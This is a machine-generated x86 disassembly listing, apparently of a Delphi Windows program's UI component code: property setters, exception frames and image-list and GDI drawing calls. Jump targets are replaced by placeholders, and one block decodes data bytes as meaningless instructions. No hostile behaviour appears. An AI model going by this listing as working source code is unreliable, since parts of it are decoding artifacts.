mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_4531bc
sub_452f04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421174
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_452f58
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403270
mov eax [ esi + 0x9c ]
call sub_403270
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_452808
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cf90
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_452fa8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c30
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_453054
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_4530b4
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4531bc
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_4532f4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_453354
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_4533b0
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_453414
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_453054
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4043f4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_40403c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_4530b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_4531ac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_452b6c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_452b58
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_4530b4
sub_4531bc
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_453234
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4043f4
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_40403c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418550
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418550
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
sub_45329c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_4532f4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4043f4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_40403c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_453354
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_4533b0
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_453414
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418550
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403420
test eax eax
je r-xdata
sub_453474
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4043f4
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_420dc4
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_453054
sub_4534c0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4534e8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_452974
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_4530b4
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_45357c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a370
mov edi eax
mov eax esi
call sub_455fa0
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_4535a8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_4535ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_453611
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453618
retn
sub_453698
fmul [ ebp + eax * 2 ]
or edx [ ebx + eax * 2 + 0x68 ]
popad
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
adc [ edi ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x45 ] dl
add [ edi + esi + 0x45 ] bl
add [ eax ] ch
add [ eax ] al
adc al 0x6c
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] ch
cmp [ ebp ] al
js r-xdata
add [ eax ] eax
out dx eax
dec eax
inc ebx
inc ebp
add [ eax ] dl
push esp
inc ebx
jne r-xdata
inc ebp
add [ eax ] al
inc esi
inc ebp
add [ eax - 0x43ffbabf ] bh
or al 0x42
add [ eax - 0x33ffbdf5 ] cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
fdiv [ edi ]
inc ebp
add [ ebp + edi + 0x38940045 ] ch
inc ebp
add [ edx + ecx * 2 + 0x4b400045 ] dh
inc ebp
add [ eax + 0x1004543 ] bh
add bh ch
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x7400408d
aaa
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx - 0x2f8a173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x217f08c ] 0xfd
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
adc [ ebp + 0x41 ] ch
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_4537dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_453828
push ebx
push esi
push edi
call sub_403624
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418638
mov edx eax
mov eax edi
call sub_454418
mov eax [ edi + 0x50 ]
call sub_403270
mov eax edi
call sub_453aec
mov eax [ edi + 0x4c ]
call sub_403270
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4208b8
test bl bl
jle r-xdata
call sub_403270
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
sub_453894
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_453941
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_4543a0
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_453960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453948
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_453960
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453a01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4283e0
mov eax ebx
call sub_4277e0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4240e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416f14
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4277e0
pop edx
call sub_42477c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453a08
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_453a24
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_453960
pop ecx
pop edx
pop ebx
retn
sub_453a5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453aec
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_453a24
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40346c
sub_453a98
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_454328
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_42784c
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_453aec
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40346c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_453a88
push eax
call ImageList_Destroy
sub_453b24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_453bb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45394c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453bbe
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov edx eax
mov eax ebx
call sub_453d4c
sub_453bc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453c73
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_453c56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_453954
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453a98
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453a98
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c5d
mov eax [ ebp - 0x10 ]
call sub_403270
retn
sub_453c90
push ebx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_453a88
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_453cb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_453d33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_453c90
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45394c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov eax ebx
mov si 0xffef
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d3a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
push esi
mov eax ebx
call sub_453a88
push eax
call ImageList_Remove
sub_453d4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_45379c
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40346c
pop esi
pop ebx
retn
sub_453d84
push ebx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_453a88
push eax
call ImageList_GetBkColor
call sub_4537bc
pop ebx
retn
sub_453dac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_45379c
push eax
mov eax ebx
call sub_453d84
call sub_45379c
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_424b20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_453a88
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4277e0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4240e4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_416f14
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4277e0
pop edx
call sub_42477c
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4277e0
call sub_424b20
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_453a88
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_416f14
mov eax [ ebx + 0x54 ]
call sub_4277e0
call sub_424b20
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_4240e4
mov eax edi
call sub_424b20
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_4240e4
mov eax edi
call sub_424b20
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_428630
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_453f80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_453fa4
pop ebx
pop ebp
retn 0xc
sub_453fa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_453ff0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416f14
mov eax [ ebp - 0x4 ]
call sub_454c84
xor eax eax
push ebp
push sub_454189
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45416c
push [ fs : eax ]
mov [ fs : eax ] esp
